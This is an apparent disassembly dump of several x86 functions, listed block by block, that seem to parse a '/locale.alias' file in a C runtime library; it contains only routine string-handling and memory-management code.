v
0xb02b461:	add	esp, 0x18
0xb02b464:	pop	ebx
0xb02b465:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b02b470
TOTAL BLOCKS :70
0xb02b5f0:	movzx	edx, byte ptr [esi + 1]
0xb02b5f4:	lea	ecx, dword ptr [esi + 1]
0xb02b5f7:	mov	dword ptr [ebp - 0x1b8], ecx
0xb02b5fd:	test	dl, dl
0xb02b5ff:	je	0xb02b63e
None
|
|
|
v
0xb02b591:	test	dl, dl
0xb02b593:	je	0xb02b748
None
|
|
|
v
0xb02b5d8:	add	esi, 1
0xb02b5db:	movzx	edx, byte ptr [esi]
0xb02b5de:	movzx	ecx, dl
0xb02b5e1:	test	byte ptr [eax + ecx*2 + 1], 0x20
0xb02b5e6:	jne	0xb02b5d8
None
|
|
|
v
0xb02b77f:	lea	esp, dword ptr [ebp - 0xc]
0xb02b782:	pop	ebx
0xb02b783:	pop	esi
0xb02b784:	pop	edi
0xb02b785:	pop	ebp
0xb02b786:	ret	
None
|
|
|
v
0xb02b4d5:	test	eax, eax
0xb02b4d7:	mov	esi, eax
0xb02b4d9:	mov	dword ptr [ebp - 0x1ac], eax
0xb02b4df:	je	0xb02b90d
None
|
|
|
v
0xb02b7a0:	mov	dword ptr [esp + 4], 0xa
0xb02b7a8:	mov	dword ptr [esp], esi
0xb02b7ab:	call	0xb07a520
None
|
|
|
v
0xb02b530:	test	eax, eax
0xb02b532:	je	0xb02b761
None
|
|
|
v
0xb02b761:	mov	eax, dword ptr [ebp - 0x1ac]
0xb02b767:	mov	dword ptr [esp], eax
0xb02b76a:	call	0xb0634f0
None
|
|
|
v
0xb02b548:	mov	esi, dword ptr [ebx - 0x110]
0xb02b54e:	movzx	edx, byte ptr [ebp - 0x1a8]
0xb02b555:	movzx	ecx, dl
0xb02b558:	mov	dword ptr [ebp - 0x1b0], eax
0xb02b55e:	mov	eax, dword ptr gs:[0]
0xb02b564:	mov	eax, dword ptr [eax + esi]
0xb02b567:	test	byte ptr [eax + ecx*2 + 1], 0x20
0xb02b56c:	je	0xb02b86f
None
|
|
|
v
0xb02b89c:	test	eax, eax
0xb02b89e:	je	0xb02b761
None
|
|
|
v
0xb02b588:	cmp	dl, 0x23
0xb02b58b:	je	0xb02b748
None
|
|
|
v
0xb02b86f:	mov	edi, dword ptr [ebp - 0x1b4]
0xb02b875:	jmp	0xb02b588
None
|
|
|
v
0xb02b599:	movzx	edx, byte ptr [edi + 1]
0xb02b59d:	lea	esi, dword ptr [edi + 1]
0xb02b5a0:	test	dl, dl
0xb02b5a2:	jne	0xb02b5be
None
|
|
|
v
0xb02b638:	mov	edi, dword ptr [ebp - 0x1bc]
0xb02b63e:	mov	eax, dword ptr [ebx + 0x1194]
0xb02b644:	mov	ecx, eax
0xb02b646:	mov	dword ptr [ebp - 0x1bc], eax
0xb02b64c:	mov	eax, dword ptr [ebx + 0x1190]
0xb02b652:	cmp	ecx, eax
0xb02b654:	jae	0xb02b87a
None
|
|
|
v
0xb02b924:	mov	dword ptr [ebp - 0x1c4], ecx
0xb02b92a:	mov	ecx, eax
0xb02b92c:	sub	ecx, edx
0xb02b92e:	mov	edx, dword ptr [ebp - 0x1c4]
0xb02b934:	mov	dword ptr [ebp - 0x1e4], ecx
0xb02b93a:	mov	ecx, dword ptr [ebp - 0x1bc]
0xb02b940:	mov	dword ptr [ebp - 0x1e8], eax
0xb02b946:	mov	dword ptr [ebp - 0x1e0], edx
0xb02b94c:	lea	ecx, dword ptr [edx + ecx*8]
0xb02b94f:	mov	dword ptr [ebp - 0x1dc], ecx
0xb02b955:	mov	ecx, edx
0xb02b957:	mov	eax, dword ptr [ebp - 0x1e4]
0xb02b95d:	add	dword ptr [edx], eax
0xb02b95f:	add	dword ptr [edx + 4], eax
0xb02b962:	add	edx, 8
0xb02b965:	cmp	edx, dword ptr [ebp - 0x1dc]
0xb02b96b:	jne	0xb02b957
None
|
|
|
v
0xb02b790:	mov	edi, dword ptr [ebp - 0x1ac]
0xb02b796:	mov	esi, dword ptr [ebp - 0x1b4]
0xb02b79c:	jmp	0xb02b7b4
None
|
|
|
v
0xb02b8f1:	mov	eax, dword ptr [ebp - 0x1d4]
0xb02b8f7:	lea	esp, dword ptr [ebp - 0xc]
0xb02b8fa:	pop	ebx
0xb02b8fb:	pop	esi
0xb02b8fc:	pop	edi
0xb02b8fd:	pop	ebp
0xb02b8fe:	ret	
None
|
|
|
v
0xb02b96d:	mov	eax, dword ptr [ebp - 0x1e8]
0xb02b973:	jmp	0xb02b826
None
|
|
|
v
0xb02b80a:	test	eax, eax
0xb02b80c:	je	0xb02b761
None
|
|
|
v
0xb02b6c0:	mov	eax, dword ptr [ebp - 0x1bc]
0xb02b6c6:	mov	ecx, dword ptr [ebp - 0x1c4]
0xb02b6cc:	mov	dword ptr [esp + 4], edi
0xb02b6d0:	lea	ecx, dword ptr [ecx + eax*8]
0xb02b6d3:	mov	eax, dword ptr [ebp - 0x1c8]
0xb02b6d9:	mov	dword ptr [ebp - 0x1c8], edx
0xb02b6df:	mov	dword ptr [ebp - 0x1c4], ecx
0xb02b6e5:	add	eax, edx
0xb02b6e7:	mov	edx, dword ptr [ebp - 0x1b8]
0xb02b6ed:	mov	dword ptr [esp], eax
0xb02b6f0:	mov	dword ptr [esp + 8], edx
0xb02b6f4:	call	0xb07d0b0
None
|
|
|
v
0xb02b87e:	lea	edx, dword ptr [eax + eax]
0xb02b881:	shl	eax, 4
0xb02b884:	mov	dword ptr [esp + 4], eax
0xb02b888:	mov	eax, dword ptr [ebx + 0xec0]
0xb02b88e:	mov	dword ptr [ebp - 0x1b8], edx
0xb02b894:	mov	dword ptr [esp], eax
0xb02b897:	call	0xb0173e0
None
|
|
|
v
0xb02b788:	xor	edx, edx
0xb02b78a:	jmp	0xb02b5de
None
|
|
|
v
0xb02b76f:	mov	edx, dword ptr [ebp - 0x1d4]
0xb02b775:	xor	eax, eax
0xb02b777:	test	edx, edx
0xb02b779:	jne	0xb02b8c7
None
|
|
|
v
0xb02b5be:	test	byte ptr [eax + edx*2 + 1], 0x20
0xb02b5c3:	je	0xb02b5b0
None
|
|
|
v
0xb02b7b4:	mov	dword ptr [esp + 8], edi
0xb02b7b8:	mov	dword ptr [esp + 4], 0x190
0xb02b7c0:	mov	dword ptr [esp], esi
0xb02b7c3:	call	0xb0697e0
None
|
|
|
v
0xb02b601:	movzx	ecx, dl
0xb02b604:	test	byte ptr [eax + ecx*2 + 1], 0x20
0xb02b609:	jne	0xb02b854
None
|
|
|
v
0xb02b673:	mov	edx, dword ptr [ebx + 0x119c]
0xb02b679:	mov	dword ptr [ebp - 0x1c8], edx
0xb02b67f:	lea	ecx, dword ptr [eax + 1]
0xb02b682:	mov	eax, dword ptr [ebp - 0x1b8]
0xb02b688:	mov	dword ptr [ebp - 0x1c0], ecx
0xb02b68e:	add	eax, edx
0xb02b690:	mov	dword ptr [ebp - 0x1cc], eax
0xb02b696:	add	eax, ecx
0xb02b698:	mov	ecx, eax
0xb02b69a:	mov	dword ptr [ebp - 0x1d0], eax
0xb02b6a0:	mov	eax, dword ptr [ebx + 0x1198]
0xb02b6a6:	cmp	ecx, eax
0xb02b6a8:	ja	0xb02b7d0
None
|
|
|
v
0xb02b826:	mov	edx, dword ptr [ebp - 0x1d8]
0xb02b82c:	mov	dword ptr [ebp - 0x1c4], ecx
0xb02b832:	mov	dword ptr [ebx + 0xec4], eax
0xb02b838:	mov	dword ptr [ebx + 0x1198], edx
0xb02b83e:	mov	edx, eax
0xb02b840:	jmp	0xb02b6c0
None
|
|
|
v
0xb02b572:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb02b87a:	test	eax, eax
0xb02b87c:	je	0xb02b8bb
None
|
|
|
v
0xb02b884:	mov	dword ptr [esp + 4], eax
0xb02b888:	mov	eax, dword ptr [ebx + 0xec0]
0xb02b88e:	mov	dword ptr [ebp - 0x1b8], edx
0xb02b894:	mov	dword ptr [esp], eax
0xb02b897:	call	0xb0173e0
None
|
|
|
v
0xb02b90d:	lea	esp, dword ptr [ebp - 0xc]
0xb02b910:	xor	eax, eax
0xb02b912:	pop	ebx
0xb02b913:	pop	esi
0xb02b914:	pop	edi
0xb02b915:	pop	ebp
0xb02b916:	ret	
None
|
|
|
v
0xb02b484:	add	ebx, 0x17fb7c
0xb02b48a:	and	ecx, 0xfffffff0
0xb02b48d:	sub	esp, ecx
0xb02b48f:	lea	esi, dword ptr [esp + 0x1f]
0xb02b493:	and	esi, 0xfffffff0
0xb02b496:	mov	dword ptr [esp + 8], edx
0xb02b49a:	mov	dword ptr [esp], esi
0xb02b49d:	mov	dword ptr [esp + 4], eax
0xb02b4a1:	call	0xb07cad0
None
|
|
|
v
0xb02b812:	mov	edx, dword ptr [ebp - 0x1c4]
0xb02b818:	mov	ecx, dword ptr [ebx + 0xec0]
0xb02b81e:	cmp	edx, eax
0xb02b820:	jne	0xb02b917
None
|
|
|
v
0xb02b662:	mov	dword ptr [esp], esi
0xb02b665:	add	eax, 1
0xb02b668:	mov	dword ptr [ebp - 0x1b8], eax
0xb02b66e:	call	0xb07ae80
None
|
|
|
v
0xb02b7c8:	test	eax, eax
0xb02b7ca:	jne	0xb02b7a0
None
|
|
|
v
0xb02b6ae:	mov	eax, dword ptr [ebx + 0xec0]
0xb02b6b4:	mov	edx, dword ptr [ebx + 0xec4]
0xb02b6ba:	mov	dword ptr [ebp - 0x1c4], eax
0xb02b6c0:	mov	eax, dword ptr [ebp - 0x1bc]
0xb02b6c6:	mov	ecx, dword ptr [ebp - 0x1c4]
0xb02b6cc:	mov	dword ptr [esp + 4], edi
0xb02b6d0:	lea	ecx, dword ptr [ecx + eax*8]
0xb02b6d3:	mov	eax, dword ptr [ebp - 0x1c8]
0xb02b6d9:	mov	dword ptr [ebp - 0x1c8], edx
0xb02b6df:	mov	dword ptr [ebp - 0x1c4], ecx
0xb02b6e5:	add	eax, edx
0xb02b6e7:	mov	edx, dword ptr [ebp - 0x1b8]
0xb02b6ed:	mov	dword ptr [esp], eax
0xb02b6f0:	mov	dword ptr [esp + 8], edx
0xb02b6f4:	call	0xb07d0b0
None
|
|
|
v
0xb02b723:	mov	esi, dword ptr [ebp - 0x1d0]
0xb02b729:	add	dword ptr [ebp - 0x1d4], 1
0xb02b730:	mov	dword ptr [ebx + 0x119c], esi
0xb02b736:	mov	dword ptr [edi + 4], eax
0xb02b739:	mov	eax, dword ptr [ebp - 0x1bc]
0xb02b73f:	add	eax, 1
0xb02b742:	mov	dword ptr [ebx + 0x1194], eax
0xb02b748:	mov	ecx, dword ptr [ebp - 0x1b0]
0xb02b74e:	test	ecx, ecx
0xb02b750:	je	0xb02b790
None
|
|
|
v
0xb02b578:	add	edi, 1
0xb02b57b:	movzx	edx, byte ptr [edi]
0xb02b57e:	movzx	ecx, dl
0xb02b581:	test	byte ptr [eax + ecx*2 + 1], 0x20
0xb02b586:	jne	0xb02b578
None
|
|
|
v
0xb02b8bb:	mov	eax, 0x320
0xb02b8c0:	mov	edx, 0x64
0xb02b8c5:	jmp	0xb02b884
None
|
|
|
v
0xb02b957:	mov	eax, dword ptr [ebp - 0x1e4]
0xb02b95d:	add	dword ptr [edx], eax
0xb02b95f:	add	dword ptr [edx + 4], eax
0xb02b962:	add	edx, 8
0xb02b965:	cmp	edx, dword ptr [ebp - 0x1dc]
0xb02b96b:	jne	0xb02b957
None
|
|
|
v
0xb02b752:	mov	eax, dword ptr [ebp - 0x1ac]
0xb02b758:	test	byte ptr [eax], 0x10
0xb02b75b:	je	0xb02b510
None
|
|
|
v
0xb02b5b0:	add	esi, 1
0xb02b5b3:	movzx	edx, byte ptr [esi]
0xb02b5b6:	test	dl, dl
0xb02b5b8:	je	0xb02b788
None
|
|
|
v
0xb02b8ff:	mov	eax, dword ptr [ebp - 0x1ac]
0xb02b905:	mov	dword ptr [esp], eax
0xb02b908:	call	0xb0634f0
None
|
|
|
v
0xb02b4f6:	lea	eax, dword ptr [ebp - 0x1a8]
0xb02b4fc:	mov	dword ptr [ebp - 0x1d4], 0
0xb02b506:	mov	dword ptr [ebp - 0x1b4], eax
0xb02b50c:	lea	esi, dword ptr [esi]
0xb02b510:	mov	eax, dword ptr [ebp - 0x1ac]
0xb02b516:	mov	edi, dword ptr [ebp - 0x1b4]
0xb02b51c:	mov	dword ptr [esp + 4], 0x190
0xb02b524:	mov	dword ptr [esp + 8], eax
0xb02b528:	mov	dword ptr [esp], edi
0xb02b52b:	call	0xb0697e0
None
|
|
|
v
0xb02b63e:	mov	eax, dword ptr [ebx + 0x1194]
0xb02b644:	mov	ecx, eax
0xb02b646:	mov	dword ptr [ebp - 0x1bc], eax
0xb02b64c:	mov	eax, dword ptr [ebx + 0x1190]
0xb02b652:	cmp	ecx, eax
0xb02b654:	jae	0xb02b87a
None
|
|
|
v
0xb02b8a4:	mov	edx, dword ptr [ebp - 0x1b8]
0xb02b8aa:	mov	dword ptr [ebx + 0xec0], eax
0xb02b8b0:	mov	dword ptr [ebx + 0x1190], edx
0xb02b8b6:	jmp	0xb02b65a
None
|
|
|
v
0xb02b5e8:	test	dl, dl
0xb02b5ea:	je	0xb02b748
None
|
|
|
v
0xb02b848:	mov	edi, dword ptr [ebp - 0x1bc]
0xb02b84e:	mov	dword ptr [ebp - 0x1b8], ecx
0xb02b854:	mov	eax, dword ptr [ebp - 0x1b8]
0xb02b85a:	cmp	dl, 0xa
0xb02b85d:	mov	byte ptr [eax], 0
0xb02b860:	jne	0xb02b63e
None
|
|
|
v
0xb02b8c7:	lea	eax, dword ptr [ebx - 0x17fbd0]
0xb02b8cd:	mov	dword ptr [esp + 0xc], eax
0xb02b8d1:	mov	eax, dword ptr [ebx + 0x1194]
0xb02b8d7:	mov	dword ptr [esp + 8], 8
0xb02b8df:	mov	dword ptr [esp + 4], eax
0xb02b8e3:	mov	eax, dword ptr [ebx + 0xec0]
0xb02b8e9:	mov	dword ptr [esp], eax
0xb02b8ec:	call	0xb032820
None
|
|
|
v
0xb02b470:	push	ebp
0xb02b471:	mov	ebp, esp
0xb02b473:	push	edi
0xb02b474:	push	esi
0xb02b475:	push	ebx
0xb02b476:	lea	ecx, dword ptr [edx + 0x2c]
0xb02b479:	sub	esp, 0x1ec
0xb02b47f:	call	0xb1267db
None
|
|
|
v
0xb02b60f:	mov	dword ptr [ebp - 0x1bc], edi
0xb02b615:	mov	ecx, dword ptr [ebp - 0x1b8]
0xb02b61b:	jmp	0xb02b62e
None
|
|
|
v
0xb02b538:	mov	dword ptr [esp + 4], 0xa
0xb02b540:	mov	dword ptr [esp], edi
0xb02b543:	call	0xb07a520
None
|
|
|
v
0xb02b6f9:	mov	edi, dword ptr [ebp - 0x1c4]
0xb02b6ff:	mov	edx, dword ptr [ebp - 0x1c8]
0xb02b705:	mov	ecx, dword ptr [ebp - 0x1c0]
0xb02b70b:	add	edx, dword ptr [ebp - 0x1cc]
0xb02b711:	mov	dword ptr [edi], eax
0xb02b713:	mov	dword ptr [esp + 4], esi
0xb02b717:	mov	dword ptr [esp + 8], ecx
0xb02b71b:	mov	dword ptr [esp], edx
0xb02b71e:	call	0xb07d0b0
None
|
|
|
v
0xb02b7cc:	jmp	0xb02b752
None
|
|
|
v
0xb02b866:	mov	byte ptr [eax + 1], 0xa
0xb02b86a:	jmp	0xb02b63e
None
|
|
|
v
0xb02b62e:	add	ecx, 1
0xb02b631:	movzx	edx, byte ptr [ecx]
0xb02b634:	test	dl, dl
0xb02b636:	jne	0xb02b620
None
|
|
|
v
0xb02b620:	movzx	edi, dl
0xb02b623:	test	byte ptr [eax + edi*2 + 1], 0x20
0xb02b628:	jne	0xb02b848
None
|
|
|
v
0xb02b7b0:	test	eax, eax
0xb02b7b2:	jne	0xb02b752
None
|
|
|
v
0xb02b5a4:	jmp	0xb02b788
None
|
|
|
v
0xb02b5c5:	mov	byte ptr [esi], 0
0xb02b5c8:	movzx	edx, byte ptr [esi + 1]
0xb02b5cc:	add	esi, 1
0xb02b5cf:	jmp	0xb02b5de
None
|
|
|
v
0xb02b748:	mov	ecx, dword ptr [ebp - 0x1b0]
0xb02b74e:	test	ecx, ecx
0xb02b750:	je	0xb02b790
None
|
|
|
v
0xb02b65a:	mov	dword ptr [esp], edi
0xb02b65d:	call	0xb07ae80
None
|
|
|
v
0xb02b5de:	movzx	ecx, dl
0xb02b5e1:	test	byte ptr [eax + ecx*2 + 1], 0x20
0xb02b5e6:	jne	0xb02b5d8
None
|
|
|
v
0xb02b7d0:	mov	edx, dword ptr [ebp - 0x1c0]
0xb02b7d6:	mov	ecx, 0x400
0xb02b7db:	add	edx, dword ptr [ebp - 0x1b8]
0xb02b7e1:	cmp	edx, 0x400
0xb02b7e7:	cmovb	edx, ecx
0xb02b7ea:	add	eax, edx
0xb02b7ec:	mov	edx, dword ptr [ebx + 0xec4]
0xb02b7f2:	mov	dword ptr [esp + 4], eax
0xb02b7f6:	mov	dword ptr [ebp - 0x1d8], eax
0xb02b7fc:	mov	dword ptr [esp], edx
0xb02b7ff:	mov	dword ptr [ebp - 0x1c4], edx
0xb02b805:	call	0xb0173e0
None
|
|
|
v
0xb02b4e5:	mov	eax, dword ptr [eax]
0xb02b4e7:	mov	edx, eax
0xb02b4e9:	or	dh, 0x80
0xb02b4ec:	test	al, 0x10
0xb02b4ee:	mov	dword ptr [esi], edx
0xb02b4f0:	jne	0xb02b8ff
None
|
|
|
v
0xb02b854:	mov	eax, dword ptr [ebp - 0x1b8]
0xb02b85a:	cmp	dl, 0xa
0xb02b85d:	mov	byte ptr [eax], 0
0xb02b860:	jne	0xb02b63e
None
|
|
|
v
0xb02b917:	cmp	dword ptr [ebp - 0x1bc], 0
0xb02b91e:	je	0xb02b826
None
|
|
|
v
0xb02b4a6:	mov	edx, 0x73
0xb02b4ab:	mov	dword ptr [eax], 0x636f6c2f
0xb02b4b1:	mov	dword ptr [eax + 4], 0x2e656c61
0xb02b4b8:	mov	dword ptr [eax + 8], 0x61696c61
0xb02b4bf:	mov	word ptr [eax + 0xc], dx
0xb02b4c3:	lea	eax, dword ptr [ebx - 0x4b01c]
0xb02b4c9:	mov	dword ptr [esp], esi
0xb02b4cc:	mov	dword ptr [esp + 4], eax
0xb02b4d0:	call	0xb063f60
None
|
|
|
v
0xb02b510:	mov	eax, dword ptr [ebp - 0x1ac]
0xb02b516:	mov	edi, dword ptr [ebp - 0x1b4]
0xb02b51c:	mov	dword ptr [esp + 4], 0x190
0xb02b524:	mov	dword ptr [esp + 8], eax
0xb02b528:	mov	dword ptr [esp], edi
0xb02b52b:	call	0xb0697e0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b02b980
TOTAL BLOCKS :40
0xb02ba9c:	mov	eax, edi
0xb02ba9e:	jmp	0xb02ba6f
None
|
|
|
v
0xb02ba30:	cmp	dl, 0x3a
0xb02ba33:	jne	0xb02baa0
None
|
|
|
v
0xb02b9ea:	lea	edi, dword ptr [esi + 1]
0xb02b9ed:	cmp	edi, ebp
0xb02b9ef:	jae	0xb02ba1c
None
|
|
|
v
0xb02baa4:	mov	dword ptr [ebx + 0x3c0], esi
0xb02baaa:	sub	esi, edi
0xb02baac:	mov	eax, edi
0xb02baae:	mov	edx, esi
0xb02bab0:	call	0xb02b470
None
|
|
|
v
0xb02ba90:	jne	0xb02bae2
None
|
|
|
v
0xb02ba16:	mov	ebp, esi
0xb02ba18:	cmp	edi, ebp
0xb02ba1a:	jb	0xb02b9f1
None
|
|
|
v
0xb02b9b1:	lea	eax, dword ptr [esp + 0x28]
0xb02b9b5:	mov	dword ptr [esp + 0x1c], eax
0xb02b9b9:	mov	edx, dword ptr [ebx + 0x1194]
0xb02b9bf:	mov	eax, dword ptr [esp + 0x50]
0xb02b9c3:	test	edx, edx
0xb02b9c5:	mov	dword ptr [esp + 0x28], eax
0xb02b9c9:	je	0xb02ba1c
None
|
|
|
v
0xb02ba35:	add	eax, 1
0xb02ba38:	mov	ecx, eax
0xb02ba3a:	add	eax, 1
0xb02ba3d:	movzx	edx, byte ptr [eax - 1]
0xb02ba41:	cmp	dl, 0x3a
0xb02ba44:	je	0xb02ba38
None
|
|
|
v
0xb02babd:	jmp	0xb02b9b9
None
|
|
|
v
0xb02baed:	jmp	0xb02ba92
None
|
|
|
v
0xb02ba7e:	cmp	dword ptr gs:[0xc], 0
0xb02ba86:	je	0xb02ba89
None
|
|
|
v
0xb02ba6f:	movzx	edx, byte ptr [eax]
0xb02ba72:	test	dl, dl
0xb02ba74:	jne	0xb02ba30
None
|
|
|
v
0xb02ba1c:	mov	eax, dword ptr [ebx + 0x3c0]
0xb02ba22:	movzx	edx, byte ptr [eax]
0xb02ba25:	test	dl, dl
0xb02ba27:	je	0xb02ba7c
None
|
|
|
v
0xb02ba29:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb02bad2:	lea	ecx, dword ptr [ebx + 0x11a0]
0xb02bad8:	call	0xb0f9430
None
|
|
|
v
0xb02badd:	jmp	0xb02b9b1
None
|
|
|
v
0xb02b9a3:	lock cmpxchg	dword ptr [ebx + 0x11a0], ecx
0xb02b9ab:	jne	0xb02bad2
None
|
|
|
v
0xb02ba48:	test	dl, dl
0xb02ba4a:	je	0xb02ba9c
None
|
|
|
v
0xb02b9cb:	mov	eax, dword ptr [ebx + 0xec0]
0xb02b9d1:	xor	edi, edi
0xb02b9d3:	mov	ebp, edx
0xb02b9d5:	mov	dword ptr [esp + 0x18], eax
0xb02b9d9:	jmp	0xb02b9f1
None
|
|
|
v
0xb02ba46:	mov	edi, ecx
0xb02ba48:	test	dl, dl
0xb02ba4a:	je	0xb02ba9c
None
|
|
|
v
0xb02bac2:	test	ecx, ecx
0xb02bac4:	je	0xb02ba1c
None
|
|
|
v
0xb02bae2:	lea	eax, dword ptr [ebx + 0x11a0]
0xb02bae8:	call	0xb0f9460
None
|
|
|
v
0xb02b9f1:	mov	eax, dword ptr [esp + 0x18]
0xb02b9f5:	lea	esi, dword ptr [ebp + edi]
0xb02b9f9:	shr	esi, 1
0xb02b9fb:	lea	ecx, dword ptr [eax + esi*8]
0xb02b9fe:	mov	eax, dword ptr [esp + 0x1c]
0xb02ba02:	mov	dword ptr [esp + 4], ecx
0xb02ba06:	mov	dword ptr [esp + 0x14], ecx
0xb02ba0a:	mov	dword ptr [esp], eax
0xb02ba0d:	call	0xb02b430
None
|
|
|
v
0xb02bab5:	test	eax, eax
0xb02bab7:	je	0xb02ba1c
None
|
|
|
v
0xb02ba12:	test	eax, eax
0xb02ba14:	jns	0xb02b9e0
None
|
|
|
v
0xb02ba4c:	lea	ecx, dword ptr [edi + 1]
0xb02ba4f:	jmp	0xb02ba5c
None
|
|
|
v
0xb02ba38:	mov	ecx, eax
0xb02ba3a:	add	eax, 1
0xb02ba3d:	movzx	edx, byte ptr [eax - 1]
0xb02ba41:	cmp	dl, 0x3a
0xb02ba44:	je	0xb02ba38
None
|
|
|
v
0xb02ba76:	mov	dword ptr [ebx + 0x3c0], eax
0xb02ba7c:	xor	edx, edx
0xb02ba7e:	cmp	dword ptr gs:[0xc], 0
0xb02ba86:	je	0xb02ba89
None
|
|
|
v
0xb02baa0:	mov	edi, eax
0xb02baa2:	jmp	0xb02ba48
None
|
|
|
v
0xb02ba58:	test	dl, dl
0xb02ba5a:	je	0xb02ba69
None
|
|
|
v
0xb02ba92:	add	esp, 0x3c
0xb02ba95:	mov	eax, edx
0xb02ba97:	pop	ebx
0xb02ba98:	pop	esi
0xb02ba99:	pop	edi
0xb02ba9a:	pop	ebp
0xb02ba9b:	ret	
None
|
|
|
v
0xb02baca:	mov	edx, dword ptr [ecx + 4]
0xb02bacd:	lea	esi, dword ptr [esi]
0xb02bad0:	jmp	0xb02ba7e
None
|
|
|
v
0xb02b993:	add	ebx, 0x17f66d
0xb02b999:	cmp	dword ptr gs:[0xc], 0
0xb02b9a1:	je	0xb02b9a4
None
|
|
|
v
0xb02ba69:	cmp	edi, esi
0xb02ba6b:	mov	eax, esi
0xb02ba6d:	jb	0xb02baa4
None
|
|
|
v
0xb02b980:	push	ebp
0xb02b981:	xor	eax, eax
0xb02b983:	push	edi
0xb02b984:	mov	ecx, 1
0xb02b989:	push	esi
0xb02b98a:	push	ebx
0xb02b98b:	sub	esp, 0x3c
0xb02b98e:	call	0xb1267db
None
|
|
|
v
0xb02b9b9:	mov	edx, dword ptr [ebx + 0x1194]
0xb02b9bf:	mov	eax, dword ptr [esp + 0x50]
0xb02b9c3:	test	edx, edx
0xb02b9c5:	mov	dword ptr [esp + 0x28], eax
0xb02b9c9:	je	0xb02ba1c
None
|
|
|
v
0xb02ba88:	lock sub	dword ptr [ebx + 0x11a0], 1
None
|
|
|
v
0xb02b9e0:	mov	ecx, dword ptr [esp + 0x14]
0xb02b9e4:	je	0xb02bac2
None
|
|
|
v
0xb02ba5c:	movzx	edx, byte ptr [ecx]
0xb02ba5f:	mov	esi, ecx
0xb02ba61:	add	ecx, 1
0xb02ba64:	cmp	dl, 0x3a
0xb02ba67:	jne	0xb02ba58
None
|
|
|
v
0xb02ba7c:	xor	edx, edx
0xb02ba7e:	cmp	dword ptr gs:[0xc], 0
0xb02ba86:	je	0xb02ba89
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b02bc20
TOTAL BLOCKS :82
0xb02bfff:	test	ebp, ebp
0xb02c001:	je	0xb02bee8
None
|
|
|
v
0xb02bda5:	mov	eax, dword ptr [esp + 0x70]
0xb02bda9:	mov	ebp, dword ptr [eax]
0xb02bdab:	test	ebp, ebp
0xb02bdad:	je	0xb02bdd6
None
|
|
|
v
0xb02bd71:	mov	ebp, dword ptr [esp + 0x48]
0xb02bd75:	test	ebp, ebp
0xb02bd77:	jne	0xb02c0ce
None
|
|
|
v
0xb02becb:	mov	eax, dword ptr [esp + 0x7c]
0xb02becf:	xor	esi, esi
0xb02bed1:	not	eax
0xb02bed3:	mov	dword ptr [esp + 0x40], eax
0xb02bed7:	mov	eax, dword ptr [esp + 0x74]
0xb02bedb:	add	eax, dword ptr [esp + 0x78]
0xb02bedf:	mov	dword ptr [esp + 0x38], eax
0xb02bee3:	jmp	0xb02bef0
None
|
|
|
v
0xb02bf28:	sub	ebp, 1
0xb02bf2b:	cmp	ebp, 0xff
0xb02bf2e:	je	0xb02bfc1
None
|
|
|
v
0xb02c16a:	xor	eax, eax
0xb02c16c:	jmp	0xb02bfcd
None
|
|
|
v
0xb02bc84:	lea	edi, dword ptr [eax + 1]
0xb02bc87:	mov	eax, dword ptr [esp + 0x7c]
0xb02bc8b:	xor	esi, esi
0xb02bc8d:	and	eax, 1
0xb02bc90:	mov	dword ptr [esp + 0x48], eax
0xb02bc94:	je	0xb02bca8
None
|
|
|
v
0xb02bd65:	mov	edx, dword ptr [esp + 0x44]
0xb02bd69:	test	edx, edx
0xb02bd6b:	jne	0xb02c0ec
None
|
|
|
v
0xb02bdd6:	mov	ecx, dword ptr [esp + 0x98]
0xb02bddd:	test	ecx, ecx
0xb02bddf:	je	0xb02c09c
None
|
|
|
v
0xb02c09e:	mov	dword ptr [esp], esi
0xb02c0a1:	call	0xb017470
None
|
|
|
v
0xb02bea2:	mov	eax, dword ptr [esp + 0x78]
0xb02bea6:	mov	dword ptr [esp + 4], eax
0xb02beaa:	mov	eax, dword ptr [esp + 0x74]
0xb02beae:	mov	dword ptr [esp], eax
0xb02beb1:	call	0xb07f050
None
|
|
|
v
0xb02be4b:	test	eax, eax
0xb02be4d:	mov	dword ptr [esp + 0x3c], eax
0xb02be51:	je	0xb02c162
None
|
|
|
v
0xb02bd7d:	mov	edi, dword ptr [esp + 0x4c]
0xb02bd81:	test	edi, edi
0xb02bd83:	jne	0xb02c0b0
None
|
|
|
v
0xb02bf04:	mov	eax, dword ptr [esp + 0x7c]
0xb02bf08:	test	eax, eax
0xb02bf0a:	js	0xb02bfc1
None
|
|
|
v
0xb02bdcf:	mov	ebp, dword ptr [ebp + 0xc]
0xb02bdd2:	test	ebp, ebp
0xb02bdd4:	jne	0xb02bdb0
None
|
|
|
v
0xb02bc2e:	add	ebx, 0x17f3d2
0xb02bc34:	mov	eax, dword ptr [esp + 0x80]
0xb02bc3b:	mov	dword ptr [esp], eax
0xb02bc3e:	call	0xb07ae80
None
|
|
|
v
0xb02c007:	mov	dword ptr [esp], ebp
0xb02c00a:	add	esi, 1
0xb02c00d:	call	0xb07ae80
None
|
|
|
v
0xb02c07f:	test	ebp, ebp
0xb02c081:	jne	0xb02bfd8
None
|
|
|
v
0xb02bc66:	mov	eax, dword ptr [esp + 0x7c]
0xb02bc6a:	xor	edi, edi
0xb02bc6c:	and	eax, 2
0xb02bc6f:	mov	dword ptr [esp + 0x44], eax
0xb02bc73:	je	0xb02bc87
None
|
|
|
v
0xb02bfe2:	mov	dword ptr [esp], ebp
0xb02bfe5:	mov	dword ptr [esp + 4], 0
0xb02bfed:	call	0xb07ed60
None
|
|
|
v
0xb02bff2:	lea	ebp, dword ptr [eax + 1]
0xb02bff5:	cmp	dword ptr [esp + 0x38], ebp
0xb02bff9:	jbe	0xb02bee8
None
|
|
|
v
0xb02bd08:	mov	eax, dword ptr [esp + 0x78]
0xb02bd0c:	mov	dword ptr [esp], esi
0xb02bd0f:	mov	dword ptr [esp + 8], eax
0xb02bd13:	mov	eax, dword ptr [esp + 0x74]
0xb02bd17:	mov	dword ptr [esp + 4], eax
0xb02bd1b:	call	0xb07d0b0
None
|
|
|
v
0xb02c077:	mov	ecx, dword ptr [esp + 0x3c]
0xb02c07b:	mov	dword ptr [ecx + esi*4 + 0xc], eax
0xb02c07f:	test	ebp, ebp
